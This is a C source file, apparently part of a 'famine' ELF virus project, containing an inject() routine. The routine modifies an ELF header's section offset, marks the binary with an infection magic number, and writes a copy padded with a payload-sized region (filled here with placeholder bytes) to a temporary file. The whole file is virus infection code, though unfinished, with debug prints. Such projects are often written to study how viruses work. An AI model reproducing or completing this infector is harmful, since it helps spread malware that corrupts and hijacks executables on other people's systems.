#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline void defer(int *fd)
{
	_close(*fd);
}

static void write_on_memory(const struct elf *file, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = file->ptr;
	
	while (index < file->data->p_offset + file->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < file->data->p_offset + file->data->p_filesz + file->offs_padding)
	{
		*dst++ = 0;
		index++;
	}
	while (index < file->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 42;
		index++;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct elf *file)
{
	__attribute__((cleanup(defer))) int fd = 0;
	char *ptr;

	file->header->e_shoff += (PAYLOAD_SIZE + 0xFD0);
	*(uint32_t *)&file->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	printf("Ready to inject\n\n"); // DEBUG

	if ((fd = _open("tmp_famine", O_RDWR | O_CREAT | O_TRUNC, 0700)) == -1)
	{
		printf("Failed to open\n"); // DEBUG;
		return ;
	}
	if ((ptr = _mmap(NULL, file->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		printf("Failed to mmap\n"); // DEBUG
		return ;
	}

	write_on_memory(file, ptr);
	_write(fd, ptr, file->note->p_offset + PAYLOAD_SIZE);

	_munmap(ptr, file->note->p_offset + PAYLOAD_SIZE);
}
